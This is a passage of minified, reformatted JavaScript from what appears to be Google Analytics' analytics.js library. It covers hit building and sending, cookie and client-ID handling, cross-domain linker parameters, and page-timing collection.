          ? J(42)
          : O.XMLHttpRequest &&
            "withCredentials" in new O.XMLHttpRequest() &&
            J(40);
      } catch (c) {}
      a.set(ld, Td(a), !0), a.set(Ac, R(a, Ac) + 1);
      var b = [];
      ue.map(function (c, d) {
        d.F &&
          null != (c = a.get(c)) &&
          c != d.defaultValue &&
          ("boolean" == typeof c && (c *= 1), b.push(d.F + "=" + K("" + c)));
      }),
        !1 === a.get(xe) && b.push("npa=1"),
        b.push("z=" + Bd()),
        (function pf(a) {
          var b = !1,
            c = !1;
          if (vd.get(89)) {
            c = !0;
            var d = a.get(kb),
              e = M.location;
            if (e) {
              var g = e.pathname || "";
              "/" != g.charAt(0) && (g = "/" + g),
                (e = e.protocol + "//" + e.hostname + g + e.search),
                (d && 0 === d.indexOf(e)) || (b = !0);
            }
          }
          return (
            !c &&
              vd.get(90) &&
              ((c = !0),
              (d = a.get(lb)) !== (e = of(!!a.get(ec), !!a.get(Kd))) &&
                (b = !0)),
            !c && vd.get(91) && ((c = !0), a.get(qf) !== M.title && (b = !0)),
            c && !b
          );
        })(a) && J(109),
        a.set(Ra, b.join("&"), !0);
    }
    function Sa(a) {
      var b = P(a, fa);
      !b && a.get(Vd) && (b = "beacon");
      var c = P(a, gd),
        d = P(a, oe),
        e = c || (d || bd(!1) + "") + "/collect",
        g = a.Z(Ia),
        ca = P(a, Ra),
        l = P(a, Na);
      if ("d" === P(a, ad))
        (e = c || (d || bd(!1) + "") + "/j/collect"),
          (b = a.get(qe) || void 0),
          pe(e, ca, b, g);
      else
        b
          ? ((g = g || ua),
            "image" == b
              ? wc(e, ca, g)
              : ("xhr" == b && wd(e, ca, g)) ||
                ("beacon" == b && x(e, ca, g)) ||
                ba(e, ca, g))
          : ba(e, ca, g);
      if (
        ((g = (ca = h(l)).hitcount),
        (ca.hitcount = g ? g + 1 : 1),
        ca.first_hit || (ca.first_hit = new Date().getTime()),
        delete h(l).pending_experiments,
        a.set(Ia, ua, !0),
        rf(a))
      )
        if (((ca = P(a, Na)), (l = sf[ca])))
          for (ca = 0; ca < l.length; ++ca)
            (g = tf(l[ca]).q) && 30 > g.length && g.push && g.push(uf(a));
        else (vf[ca] = vf[ca] || []), 30 > vf[ca].length && vf[ca].push(uf(a));
    }
    function Hc(a) {
      qc().expId && a.set(Nc, qc().expId),
        qc().expVar && a.set(Oc, qc().expVar);
      var b = P(a, Na);
      if ((b = h(b).pending_experiments)) {
        var c = [];
        for (d in b)
          b.hasOwnProperty(d) &&
            b[d] &&
            c.push(encodeURIComponent(d) + "." + encodeURIComponent(b[d]));
        var d = c.join("!");
      } else d = void 0;
      d && ((b = a.get(m)) && (d = b + "!" + d), a.set(m, d, !0));
    }
    function cd() {
      if (O.navigator && "preview" == O.navigator.loadPurpose) throw "abort";
    }
    function yd(a) {
      var b = O.gaDevIds || [];
      if (ka(b)) {
        var c = a.get("&did");
        qa(c) && 0 < c.length && (b = b.concat(c.split(","))), (c = []);
        for (var d = 0; d < b.length; d++) Ee(c, b[d]) || c.push(b[d]);
        0 != c.length && a.set("&did", c.join(","), !0);
      }
    }
    function vb(a) {
      if (!a.get(Na)) throw "abort";
    }
    function Pe(a) {
      try {
        if (!a.get(Qe) && (a.set(Qe, !0), !a.get("&gtm"))) {
          var b = void 0;
          if (
            (lf(be("gtm_debug")) && (b = 2),
            !b && D(M.referrer, "https://tagassistant.google.com/") && (b = 3),
            !b && Ee(M.cookie.split("; "), "__TAG_ASSISTANT=x") && (b = 4),
            b ||
              (lf(
                M.documentElement.getAttribute("data-tag-assistant-present"),
              ) &&
                (b = 5)),
            b)
          ) {
            O["google.tagmanager.debugui2.queue"] ||
              ((O["google.tagmanager.debugui2.queue"] = []),
              Id(
                "https://www.google-analytics.com/debug/bootstrap?id=" +
                  a.get(Na) +
                  "&src=LEGACY&cond=" +
                  b,
              ));
            var d = M.currentScript;
            O["google.tagmanager.debugui2.queue"].push({
              messageType: "LEGACY_CONTAINER_STARTING",
              data: { id: a.get(Na), scriptSource: (d && d.src) || "" },
            });
          }
        }
      } catch (e) {}
    }
    function lf(a) {
      if (null == a || 0 === a.length) return !1;
      a = Number(a);
      var b = Date.now();
      return a < b + 3e5 && a > b - 9e5;
    }
    (Ha.prototype.add = function (a) {
      this.M.push(a);
    }),
      (Ha.prototype.D = function (a) {
        try {
          for (var b = 0; b < this.M.length; b++) {
            var c = a.get(this.M[b]);
            c && ea(c) && c.call(O, a);
          }
        } catch (d) {}
        (b = a.get(Ia)) != ua &&
          ea(b) &&
          (a.set(Ia, ua, !0), setTimeout(b, 10));
      });
    var hd = function () {
        return Math.round(2147483647 * Math.random());
      },
      Bd = function () {
        try {
          var a = new Uint32Array(1);
          return O.crypto.getRandomValues(a), 2147483647 & a[0];
        } catch (b) {
          return hd();
        }
      };
    function Ta(a) {
      var b = R(a, Ua);
      500 <= b && J(15);
      var c = P(a, Va);
      if ("transaction" != c && "item" != c) {
        c = R(a, Wa);
        var d = new Date().getTime(),
          e = R(a, Xa);
        if (
          (0 == e && a.set(Xa, d),
          0 < (e = Math.round((2 * (d - e)) / 1e3)) &&
            ((c = Math.min(c + e, 20)), a.set(Xa, d)),
          0 >= c)
        )
          throw "abort";
        a.set(Wa, --c);
      }
      a.set(Ua, ++b);
    }
    var Ya = function () {
      this.data = new ee();
    };
    Ya.prototype.get = function (a) {
      var b = $a(a),
        c = this.data.get(a);
      return (
        b &&
          null == c &&
          (c = ea(b.defaultValue) ? b.defaultValue() : b.defaultValue),
        b && b.Z ? b.Z(this, a, c) : c
      );
    };
    var P = function (a, b) {
        return null == (a = a.get(b)) ? "" : "" + a;
      },
      R = function (a, b) {
        return null == (a = a.get(b)) || "" === a ? 0 : Number(a);
      };
    (Ya.prototype.Z = function (a) {
      return (a = this.get(a)) && ea(a) ? a : ua;
    }),
      (Ya.prototype.set = function (a, b, c) {
        if (a)
          if ("object" == typeof a)
            for (var d in a) a.hasOwnProperty(d) && ab(this, d, a[d], c);
          else ab(this, a, b, c);
      });
    var ab = function (a, b, c, d) {
        if (null != c && b === Na) wb.test(c);
        var e = $a(b);
        e && e.o ? e.o(a, b, c, d) : a.data.set(b, c, d);
      },
      gf = {
        hitPayload: 88,
        location: 89,
        referrer: 90,
        title: 91,
        buildHitTask: 93,
        sendHitTask: 94,
        displayFeaturesTask: 95,
        customTask: 97,
        cookieName: 98,
        cookieDomain: 99,
        cookiePath: 100,
        cookieExpires: 101,
        cookieUpdate: 102,
        cookieFlags: 103,
        storage: 104,
        _x_19: 105,
        transportUrl: 106,
        allowAdFeatures: 107,
        sampleRate: 108,
      };
    function hf(a, b) {
      var c = gf[a];
      c && J(c),
        "displayFeaturesTask" === a && null == b && J(96),
        /.*Task$/.test(a) && J(92);
    }
    function mf(a, b) {
      if (a)
        if ("object" == typeof a)
          for (var c in a) a.hasOwnProperty(c) && hf(c, b);
        else hf(a, b);
    }
    var ue = new ee(),
      ve = [],
      bb = function (a, b, c, d, e) {
        (this.name = a),
          (this.F = b),
          (this.Z = d),
          (this.o = e),
          (this.defaultValue = c);
      };
    function $a(a) {
      var b = ue.get(a);
      if (!b)
        for (var c = 0; c < ve.length; c++) {
          var d = ve[c],
            e = d[0].exec(a);
          if (e) {
            (b = d[1](e)), ue.set(b.name, b);
            break;
          }
        }
      return b;
    }
    function S(a, b, c, d, e) {
      return (a = new bb(a, b, c, d, e)), ue.set(a.name, a), a.name;
    }
    function cb(a, b) {
      ve.push([new RegExp("^" + a + "$"), b]);
    }
    function T(a, b, c) {
      return S(a, b, c, void 0, db);
    }
    function db() {}
    var hb = T("apiVersion", "v"),
      ib = T("clientVersion", "_v");
    S("anonymizeIp", "aip");
    var jb = S("adSenseId", "a"),
      Va = S("hitType", "t"),
      Ia = S("hitCallback"),
      Ra = S("hitPayload");
    S("nonInteraction", "ni"), S("currencyCode", "cu"), S("dataSource", "ds");
    var Vd = S("useBeacon", void 0, !1),
      fa = S("transport");
    S("sessionControl", "sc", ""),
      S("sessionGroup", "sg"),
      S("queueTime", "qt");
    var Ac = S("_s", "_s"),
      Ie = S("_no_slc");
    S("screenName", "cd");
    var kb = S("location", "dl", ""),
      lb = S("referrer", "dr"),
      mb = S("page", "dp", "");
    S("hostname", "dh");
    var nb = S("language", "ul"),
      ob = S("encoding", "de"),
      qf = S("title", "dt", function () {
        return M.title || void 0;
      });
    cb("contentGroup([0-9]+)", function (a) {
      return new bb(a[0], "cg" + a[1]);
    });
    var pb = S("screenColors", "sd"),
      qb = S("screenResolution", "sr"),
      rb = S("viewportSize", "vp"),
      sb = S("javaEnabled", "je"),
      tb = S("flashVersion", "fl");
    S("campaignId", "ci"),
      S("campaignName", "cn"),
      S("campaignSource", "cs"),
      S("campaignMedium", "cm"),
      S("campaignKeyword", "ck"),
      S("campaignContent", "cc");
    var ub = S("eventCategory", "ec"),
      xb = S("eventAction", "ea"),
      yb = S("eventLabel", "el"),
      zb = S("eventValue", "ev"),
      Bb = S("socialNetwork", "sn"),
      Cb = S("socialAction", "sa"),
      Db = S("socialTarget", "st"),
      Eb = S("l1", "plt"),
      Fb = S("l2", "pdt"),
      Gb = S("l3", "dns"),
      Hb = S("l4", "rrt"),
      Ib = S("l5", "srt"),
      Jb = S("l6", "tcp"),
      Kb = S("l7", "dit"),
      Lb = S("l8", "clt"),
      Ve = S("l9", "_gst"),
      We = S("l10", "_gbt"),
      Xe = S("l11", "_cst"),
      Ye = S("l12", "_cbt"),
      Mb = S("timingCategory", "utc"),
      Nb = S("timingVar", "utv"),
      Ob = S("timingLabel", "utl"),
      Pb = S("timingValue", "utt");
    S("appName", "an"),
      S("appVersion", "av", ""),
      S("appId", "aid", ""),
      S("appInstallerId", "aiid", ""),
      S("exDescription", "exd"),
      S("exFatal", "exf");
    var Nc = S("expId", "xid"),
      Oc = S("expVar", "xvar"),
      m = S("exp", "exp"),
      Rc = S("_utma", "_utma"),
      Sc = S("_utmz", "_utmz"),
      Tc = S("_utmht", "_utmht"),
      Ua = S("_hc", void 0, 0),
      Xa = S("_ti", void 0, 0),
      Wa = S("_to", void 0, 20);
    cb("dimension([0-9]+)", function (a) {
      return new bb(a[0], "cd" + a[1]);
    }),
      cb("metric([0-9]+)", function (a) {
        return new bb(a[0], "cm" + a[1]);
      }),
      S(
        "linkerParam",
        void 0,
        void 0,
        function Bc(a) {
          if (a.get(Ze)) return J(35), De.generate($e(a));
          var b = P(a, Q),
            c = P(a, I) || "";
          return (
            (b = "_ga=2." + K(pa(c + b, 0) + "." + c + "-" + b)),
            (a = af(a))
              ? (J(44),
                (a =
                  "&_gac=1." + K([pa(a.qa, 0), a.timestamp, a.qa].join("."))))
              : (a = ""),
            b + a
          );
        },
        db,
      );
    var Ze = T("_cd2l", void 0, !1),
      ld = S("usage", "_u"),
      Gd = S("_um");
    S(
      "forceSSL",
      void 0,
      void 0,
      function () {
        return Ba;
      },
      function (a, b, c) {
        J(34), (Ba = !!c);
      },
    );
    var ed = S("_j1", "jid"),
      ia = S("_j2", "gjid");
    cb("\\&(.*)", function (a) {
      var b = new bb(a[0], a[1]),
        c = (function yc(a) {
          var b;
          return (
            ue.map(function (c, d) {
              d.F == a && (b = d);
            }),
            b && b.name
          );
        })(a[0].substring(1));
      return (
        c &&
          ((b.Z = function (d) {
            return d.get(c);
          }),
          (b.o = function (d, e, g, ca) {
            d.set(c, g, ca);
          }),
          (b.F = void 0)),
        b
      );
    });
    var Qb = T("_oot"),
      dd = S("previewTask"),
      Rb = S("checkProtocolTask"),
      md = S("validationTask"),
      Sb = S("checkStorageTask"),
      Uc = S("historyImportTask"),
      Tb = S("samplerTask"),
      Vb = S("_rlt"),
      Wb = S("buildHitTask"),
      Xb = S("sendHitTask"),
      Vc = S("ceTask"),
      zd = S("devIdTask"),
      Cd = S("timingTask"),
      Ld = S("displayFeaturesTask"),
      oa = S("customTask"),
      ze = S("fpsCrossDomainTask"),
      Re = T("_cta"),
      V = T("name"),
      Q = T("clientId", "cid"),
      n = T("clientIdTime"),
      xd = T("storedClientId"),
      Ad = S("userId", "uid"),
      Na = T("trackingId", "tid"),
      U = T("cookieName", void 0, "_ga"),
      W = T("cookieDomain"),
      Yb = T("cookiePath", void 0, "/"),
      Zb = T("cookieExpires", void 0, 63072e3),
      Hd = T("cookieUpdate", void 0, !0),
      Be = T("cookieFlags", void 0, ""),
      $b = T("legacyCookieDomain"),
      Wc = T("legacyHistoryImport", void 0, !0),
      ac = T("storage", void 0, "cookie"),
      bc = T("allowLinker", void 0, !1),
      cc = T("allowAnchor", void 0, !0),
      Ka = T("sampleRate", "sf", 100),
      dc = T("siteSpeedSampleRate", void 0, 1),
      ec = T("alwaysSendReferrer", void 0, !1),
      I = T("_gid", "_gid"),
      la = T("_gcn"),
      Kd = T("useAmpClientId"),
      ce = T("_gclid"),
      fe = T("_gt"),
      he = T("_ge", void 0, 7776e6),
      ie = T("_gclsrc"),
      je = T("storeGac", void 0, !0),
      oe = S("_x_19"),
      Ae = S("_fplc", "_fplc"),
      F = T("_cs"),
      Je = T("_useUp", void 0, !1),
      Le = S("up", "up"),
      Qe = S("_tac", void 0, !1),
      Se = T("_gbraid"),
      Te = T("_gbt"),
      bf = T("_gbe", void 0, 7776e6),
      gd = S("transportUrl"),
      Md = S("_r", "_r"),
      Od = S("_slc", "_slc"),
      qe = S("_dp"),
      ad = S("_jt", void 0, "n"),
      Ud = S("allowAdFeatures", void 0, !0),
      xe = S("allowAdPersonalizationSignals", void 0, !0);
    function X(a, b, c, d) {
      b[a] = function () {
        try {
          return d && J(d), c.apply(this, arguments);
        } catch (e) {
          throw (ge("exc", a, e && e.name), e);
        }
      };
    }
    var Ed = function (a) {
        if ("cookie" == a.get(ac))
          return 0 < (a = Ca("FPLC")).length ? a[0] : void 0;
      },
      Fe = function (a) {
        var b;
        (b = P(a, oe) && a.get(Ze)) &&
          (b = !((b = De.get(a.get(cc))) && b._fplc)),
          b && !Ed(a) && a.set(Ae, "0");
      },
      gc = function (a) {
        var b = {};
        if (Ec(b) || Fc(b)) {
          var c = b[Eb];
          null == c ||
            1 / 0 == c ||
            isNaN(c) ||
            (0 < c
              ? (Y(b, Gb),
                Y(b, Jb),
                Y(b, Ib),
                Y(b, Fb),
                Y(b, Hb),
                Y(b, Kb),
                Y(b, Lb),
                Y(b, Ve),
                Y(b, We),
                Y(b, Xe),
                Y(b, Ye),
                va(function () {
                  a(b);
                }, 10))
              : L(
                  O,
                  "load",
                  function () {
                    gc(a);
                  },
                  !1,
                ));
        }
      },
      Ec = function (a) {
        var b = O.performance || O.webkitPerformance;
        if (!(b = b && b.timing)) return !1;
        var c = b.navigationStart;
        return (
          0 != c &&
          ((a[Eb] = b.loadEventStart - c),
          (a[Gb] = b.domainLookupEnd - b.domainLookupStart),
          (a[Jb] = b.connectEnd - b.connectStart),
          (a[Ib] = b.responseStart - b.requestStart),
          (a[Fb] = b.responseEnd - b.responseStart),
          (a[Hb] = b.fetchStart - c),
          (a[Kb] = b.domInteractive - c),
          (a[Lb] = b.domContentLoadedEventStart - c),
          (a[Ve] = N.L - c),
          (a[We] = N.ya - c),
          O.google_tag_manager &&
            O.google_tag_manager._li &&
            ((b = O.google_tag_manager._li), (a[Xe] = b.cst), (a[Ye] = b.cbt)),
          !0)
        );
      },
      Fc = function (a) {
        if (O.top != O) return !1;
        var b = O.external,
          c = b && b.onloadT;
        return (
          b && !b.isValidLoadTime && (c = void 0),
          2147483648 < c && (c = void 0),
          0 < c && b.setPageReadyTime(),
          null != c && ((a[Eb] = c), !0)
        );
      },
      Y = function (a, b) {
        var c = a[b];
        (isNaN(c) || 1 / 0 == c || 0 > c) && (a[b] = void 0);
      },
      Fd = function (a) {
        return function (b) {
          if ("pageview" == b.get(Va) && !a.I) {
            a.I = !0;
            var c = (function (a) {
                var b = Math.min(R(a, dc), 100);
                return !(La(P(a, Q)) % 100 >= b);
              })(b),
              d = 0 < E(P(b, kb), "gclid").length,
              e = 0 < E(P(b, kb), "wbraid").length;
            (c || d || e) &&
              gc(function (g) {
                c && a.send("timing", g), (d || e) && a.send("adtiming", g);
              });
          }
        };
      },
      hc = !1,
      mc = function (a) {
        if ("cookie" == P(a, ac)) {
          if (a.get(Hd) || P(a, xd) != P(a, Q)) {
            var b = 1e3 * R(a, Zb);
            ma(a, Q, U, b), a.data.set(xd, P(a, Q));
          }
          if (
            ((a.get(Hd) || uc(a) != P(a, I)) && ma(a, I, la, 864e5), a.get(je))
          ) {
            if ((b = P(a, ce))) {
              var c = Math.min(R(a, he), 1e3 * R(a, Zb));
              (c =
                0 === c
                  ? 0
                  : Math.min(c, 1e3 * R(a, fe) + c - new Date().getTime())),
                a.data.set(he, c);
              var d = {},
                e = P(a, fe),
                g = P(a, ie),
                ca = kc(P(a, Yb)),
                l = lc(P(a, W)),
                k = P(a, Na),
                w = P(a, Be);
              g && "aw.ds" != g
                ? d && (d.ua = !0)
                : ((b = ["1", e, Cc(b)].join(".")),
                  0 <= c &&
                    (d && (d.ta = !0), zc("_gac_" + Cc(k), b, ca, l, k, c, w))),
                le(d);
            }
          } else J(75);
          a.get(je) &&
            (b = P(a, Se)) &&
            ((c =
              0 === (c = Math.min(R(a, bf), 1e3 * R(a, Zb)))
                ? 0
                : Math.min(c, 1e3 * R(a, Te) + c - new Date().getTime())),
            a.data.set(bf, c),
            (d = {}),
            (w = P(a, Te)),
            (ca = kc(P(a, Yb))),
            (l = lc(P(a, W))),
            (k = P(a, Na)),
            (a = P(a, Be)),
            (b = ["1", w, Cc(b)].join(".")),
            0 <= c &&
              (d && (d.ta = !0), zc("_gac_gb_" + Cc(k), b, ca, l, k, c, a)),
            ef(d));
        }
      },
      ma = function (a, b, c, d) {
        var e = nd(a, b);
        if (e) {
          c = P(a, c);
          var g = kc(P(a, Yb)),
            ca = lc(P(a, W)),
            l = P(a, Be),
            k = P(a, Na);
          if ("auto" != ca) zc(c, e, g, ca, k, d, l) && (hc = !0);
          else {
            J(32);
            for (var w = id(), Ce = 0; Ce < w.length; Ce++)
              if (
                ((ca = w[Ce]),
                a.data.set(W, ca),
                (e = nd(a, b)),
                zc(c, e, g, ca, k, d, l))
              )
                return void (hc = !0);
            a.data.set(W, "auto");
          }
        }
      },
      uc = function (a) {
        var b = Ca(P(a, la));
        return Xd(a, b);
      },
      nc = function (a) {
        if ("cookie" == P(a, ac) && !hc && (mc(a), !hc)) throw "abort";
      },
      Yc = function (a) {
        if (a.get(Wc)) {
          var b = P(a, W),
            c = P(a, $b) || xa(),
            d = Xc("__utma", c, b);
          d &&
            (J(19),
            a.set(Tc, new Date().getTime(), !0),
            a.set(Rc, d.R),
            (b = Xc("__utmz", c, b)) && d.hash == b.hash && a.set(Sc, b.R));
        }
      },
      nd = function (a, b) {
        b = Cc(P(a, b));
        var c = lc(P(a, W)).split(".").length;
        return (
          1 < (a = jc(P(a, Yb))) && (c += "-" + a),
          b ? ["GA1", c, b].join(".") : ""
        );
      },
      Xd = function (a, b) {
        return na(b, P(a, W), P(a, Yb));
      },
      na = function (a, b, c) {
        if (!a || 1 > a.length) J(12);
        else {
          for (var d = [], e = 0; e < a.length; e++) {
            var g = a[e],
              ca = g.split("."),
              l = ca.shift();
            ("GA1" == l || "1" == l) && 1 < ca.length
              ? (1 == (g = ca.shift().split("-")).length && (g[1] = "1"),
                (g[0] *= 1),
                (g[1] *= 1),
                (ca = { H: g, s: ca.join(".") }))
              : (ca = kd.test(g) ? { H: [0, 0], s: g } : void 0),
              ca && d.push(ca);
          }
          if (1 == d.length) return J(13), d[0].s;
          if (0 != d.length)
            return (
              J(14),
              1 == (d = Gc(d, lc(b).split(".").length, 0)).length
                ? d[0].s
                : (1 < (d = Gc(d, jc(c), 1)).length && J(41), d[0] && d[0].s)
            );
          J(12);
        }
      },
      Gc = function (a, b, c) {
        for (var g, d = [], e = [], ca = 0; ca < a.length; ca++) {
          var l = a[ca];
          l.H[c] == b
            ? d.push(l)
            : null == g || l.H[c] < g
              ? ((e = [l]), (g = l.H[c]))
              : l.H[c] == g && e.push(l);
        }
        return 0 < d.length ? d : e;
      },
      lc = function (a) {
        return 0 == a.indexOf(".") ? a.substr(1) : a;
      },
      id = function () {
        var a = [],
          b = xa().split(".");
        if (4 == b.length) {
          var c = b[b.length - 1];
          if (parseInt(c, 10) == c) return ["none"];
        }
        for (c = b.length - 2; 0 <= c; c--) a.push(b.slice(c).join("."));
        return (
          (b = M.location.hostname),
          eb.test(b) || vc.test(b) || a.push("none"),
          a
        );
      },
      kc = function (a) {
        return a
          ? (1 < a.length &&
              a.lastIndexOf("/") == a.length - 1 &&
              (a = a.substr(0, a.length - 1)),
            0 != a.indexOf("/") && (a = "/" + a),
            a)
          : "/";
      },
      jc = function (a) {
        return "/" == (a = kc(a)) ? 1 : a.split("/").length;
      },
      le = function (a) {
        a.ta && J(77), a.na && J(74), a.pa && J(73), a.ua && J(69);
      },
      ef = function (a) {
        a.ta && J(85), a.na && J(86), a.pa && J(87);
      };
    function Xc(a, b, c) {
      "none" == b && (b = "");
      var d = [],
        e = Ca(a);
      a = "__utma" == a ? 6 : 2;
      for (var g = 0; g < e.length; g++) {
        var ca = ("" + e[g]).split(".");
        ca.length >= a && d.push({ hash: ca[0], R: e[g], O: ca });
      }
      if (0 != d.length)
        return 1 == d.length
          ? d[0]
          : Zc(b, d) || Zc(c, d) || Zc(null, d) || d[0];
    }
    function Zc(a, b) {
      if (null == a) var c = (a = 1);
      else (c = La(a)), (a = La(D(a, ".") ? a.substring(1) : "." + a));
      for (var d = 0; d < b.length; d++)
        if (b[d].hash == c || b[d].hash == a) return b[d];
    }
    var Jc = new RegExp(/^https?:\/\/([^\/:]+)/),
      De = O.google_tag_data.glBridge,
      Kc = RegExp("(.*)([?&#])(?:_ga=[^&#]*)(?:&?)(.*)"),
      od = RegExp("(.*)([?&#])(?:_gac=[^&#]*)(?:&?)(.*)");
    function Ic(a, b) {
      var c = new Date(),
        d = O.navigator,
        e = d.plugins || [];
      for (
        a = [
          a,
          d.userAgent,
          c.getTimezoneOffset(),
          c.getYear(),
          c.getDate(),
          c.getHours(),
          c.getMinutes() + b,
        ],
          b = 0;
        b < e.length;
        ++b
      )
        a.push(e[b].description);
      return La(a.join("."));
    }
    function pa(a, b) {
      var c = new Date(),
        d = O.navigator,
        e = c.getHours() + Math.floor((c.getMinutes() + b) / 60);
      return La(
        [
          a,
          d.userAgent,
          d.language || "",
          c.getTimezoneOffset(),
          c.getYear(),
          c.getDate() + Math.floor(e / 24),
          (24 + e) % 24,
          (60 + c.getMinutes() + b) % 60,
        ].join("."),
      );
    }
    var Dc = function (a) {
      J(48), (this.target = a), (this.T = !1);
    };
    Dc.prototype.ca = function (a, b) {
      if (a) {
        if (this.target.get(Ze)) return De.decorate($e(this.target), a, b);
        if (a.tagName) {
          if ("a" == a.tagName.toLowerCase())
            return void (a.href && (a.href = qd(this, a.href, b)));
          if ("form" == a.tagName.toLowerCase()) return rd(this, a);
        }
        if ("string" == typeof a) return qd(this, a, b);
      }
    };
    var qd = function (a, b, c) {
        var d = Kc.exec(b);
        d && 3 <= d.length && (b = d[1] + (d[3] ? d[2] + d[3] : "")),
          (d = od.exec(b)) &&
            3 <= d.length &&
            (b = d[1] + (d[3] ? d[2] + d[3] : "")),
          (a = a.target.get("linkerParam")),
          (d = b.indexOf("?"));
        var e = b.indexOf("#");
        return (b = (b = c
          ? b + (-1 == e ? "#" : "&") + a
          : -1 == e
            ? b + (-1 === d ? "?" : "&") + a
            : b.substring(0, e) +
              (-1 === d || d > e ? "?" : "&") +
              a +
              b.substring(e)).replace(/&+_ga=/, "&_ga=")).replace(
          RegExp("&+_gac="),
          "&_gac=",
        );
      },
      rd = function (a, b) {
        if (b && b.action)
          if ("get" == b.method.toLowerCase()) {
            a = a.target.get("linkerParam").split("&");
            for (var c = 0; c < a.length; c++) {
              var d = a[c].split("="),
                e = d[1];
              d = d[0];
              for (
                var g = b.childNodes || [], ca = !1, l = 0;
                l < g.length;
                l++
              )
                if (g[l].name == d) {
                  g[l].setAttribute("value", e), (ca = !0);
                  break;
                }
              ca ||
                ((g = M.createElement("input")).setAttribute("type", "hidden"),
                g.setAttribute("name", d),
                g.setAttribute("value", e),
                b.appendChild(g));
            }
          } else
            "post" == b.method.toLowerCase() && (b.action = qd(a, b.action));
      };
    function sd(a, b) {
      if (b == M.location.hostname) return !1;
      for (var c = 0; c < a.length; c++)
        if (a[c] instanceof RegExp) {
          if (a[c].test(b)) return !0;
        } else if (0 <= b.indexOf(a[c])) return !0;
      return !1;
    }
    function ke(a, b) {
      return (
        b != Ic(a, 0) &&
        b != Ic(a, -1) &&
        b != Ic(a, -2) &&
        b != pa(a, 0) &&
        b != pa(a, -1) &&
        b != pa(a, -2)
      );
    }
    function $e(a) {
      var b = af(a),
        c = {};
      return (
        (c._ga = a.get(Q)),
        (c._gid = a.get(I) || void 0),
        (c._gac = b ? [b.qa, b.timestamp].join(".") : void 0),
        (b = a.get(Ae)),
        (a = Ed(a)),
        (c._fplc = b && "0" !== b ? b : a),
        c
      );
    }
    function af(a) {
      function b(e) {
        return null == e || "" === e ? 0 : Number(e);
      }
      var c = a.get(ce);
      if (c && a.get(je)) {
        var d = b(a.get(fe));
        if (!(1e3 * d + b(a.get(he)) <= new Date().getTime()))
          return { timestamp: d, qa: c };
        J(76);
      }
    }
    (Dc.prototype.S = function (a, b, c) {
      function d(g) {
        try {
          g = g || O.event;
          a: {
            var ca = g.target || g.srcElement;
            for (g = 100; ca && 0 < g; ) {
              if (ca.href && ca.nodeName.match(/^a(?:rea)?$/i)) {
                var l = ca;
                break a;
              }
              (ca = ca.parentNode), g--;
            }
            l = {};
          }
          ("http:" == l.protocol || "https:" == l.protocol) &&
            sd(a, l.hostname || "") &&
            l.href &&
            (l.href = qd(e, l.href, b));
        } catch (k) {
          J(26);
        }
      }
      var e = this;
      this.target.get(Ze)
        ? De.auto(
            function () {
              return $e(e.target);
            },
            a,
            b ? "fragment" : "",
            c,
          )
        : (this.T ||
            ((this.T = !0), L(M, "mousedown", d, !1), L(M, "keyup", d, !1)),
          c &&
            L(M, "submit", function (g) {
              if ((g = (g = g || O.event).target || g.srcElement) && g.action) {
                var ca = g.action.match(Jc);
                ca && sd(a, ca[1]) && rd(e, g);
              }
            }));
    }),
      (Dc.prototype.$ = function (a) {
        if (a) {
          var b = this,
            c = b.target.get(F);
          void 0 !== c &&
            De.passthrough(
              function () {
                if (c("analytics_storage")) return {};
                var d = {};
                return (d._ga = b.target.get(Q)), (d._up = "1"), d;
              },
              1,
              !0,
            );
        }
      });
    var p = /^(GTM|OPT)-[A-Z0-9]+$/,
      q = /;_gaexp=[^;]*/g,
      r = /;((__utma=)|([^;=]+=GAX?\d+\.))[^;]*/g,
      Aa =
        /^https?:\/\/[\w\-.]+\.google.com(:\d+)?\/optimize\/opt-launch\.html\?.*$/,
      nf = 0,
      wf = {},
      Ke = function (a, b, c, d) {
        c = c || {};
        var e = O.google_tag_data.tcBridge;
        if (p.test(b)) var g = 1;
        else {
          var ca = b.split("-");
          1 < ca.length && "GTM" !== ca[0] && "UA" !== ca[0] && (g = 2);
        }
        if (g) {
          ca = { id: b, type: g, B: c.dataLayer || "dataLayer", G: !1 };
          var l = void 0;
          switch ((a.get("&gtm") == b && (ca.G = !0), g)) {
            case 1:
              (ca.ia = !!a.get("anonymizeIp")),
                (ca.sync = d),
                "t0" != (b = String(a.get("name"))) && (ca.target = b),
                G(String(a.get("trackingId"))) ||
                  ((ca.clientId = String(a.get(Q))),
                  (ca.ka = Number(a.get(n))),
                  (b = c.palindrome ? r : q),
                  (b = (b = M.cookie.replace(/^|(; +)/g, ";").match(b))
                    ? b.sort().join("").substring(1)
                    : void 0),
                  (ca.la = b),
                  (ca.qa = E(P(a, kb), "gclid")));
              break;
            case 2:
              if (20 <= nf) return;
              nf++,
                (ca.context = "c"),
                ((l = {}).is_legacy_loaded = !0),
                (ca.sa = !0),
                e.registerUa(a.get("name"), a.get("trackingId")),
                e.setSideload(a.get("name"), b, a.get("trackingId"));
          }
          return (
            (function (a, b) {
              var c = new Date().getTime();
              (O[a.B] = O[a.B] || []),
                wf[a.B] ||
                  ((wf[a.B] = !0),
                  (c = { "gtm.start": c }),
                  a.sync || (c.event = "gtm.js"),
                  O[a.B].push(c)),
                2 === a.type &&
                  (function (d, e, g) {
                    O[a.B].push(arguments);
                  })("config", a.id, b);
            })(ca, l),
            (function (a) {
              function b(d, e) {
                e && (c += "&" + d + "=" + K(e));
              }
              var c = Ge(a.type) + K(a.id);
              return (
                "dataLayer" != a.B && b("l", a.B),
                b("cx", a.context),
                b("t", a.target),
                b("cid", a.clientId),
                b("cidt", a.ka),
                b("gac", a.la),
                b("aip", a.ia),
                a.sa && b("_slc", "1"),
                a.sync && b("m", "sync"),
                b("cycle", a.G),
                a.qa && b("gclid", a.qa),
                Aa.test(M.referrer) && b("cb", String(hd())),
                c
              );
            })(ca)
          );
        }
      },
      Jd = function (a, b) {
        b ||
          (b =
            (b = P(a, V)) && "t0" != b
              ? Wd.test(b)
                ? "_gat_" + Cc(P(a, Na))
                : "_gat_" + Cc(b)
              : "_gat"),
          (this.Y = b);
      },
      Pd = function (a, b, c) {
        !1 === b.get(Ud) ||
          b.get(c) ||
          ("1" == Ca(a.Y)[0] ? b.set(c, "", !0) : b.set(c, "" + hd(), !0));
      },
      Qd = function (a, b) {
        se(b) && zc(a.Y, "1", P(b, Yb), P(b, W), P(b, Na), 6e4, P(b, Be));
      },
      se = function (a) {
        return !!a.get(ed) && !1 !== a.get(Ud);
      },
      Ne = function (a) {
        return !H[P(a, Na)] && rf(a);
      },
      re = function (a, b) {
        var c = new ee(),
          d = function (g) {
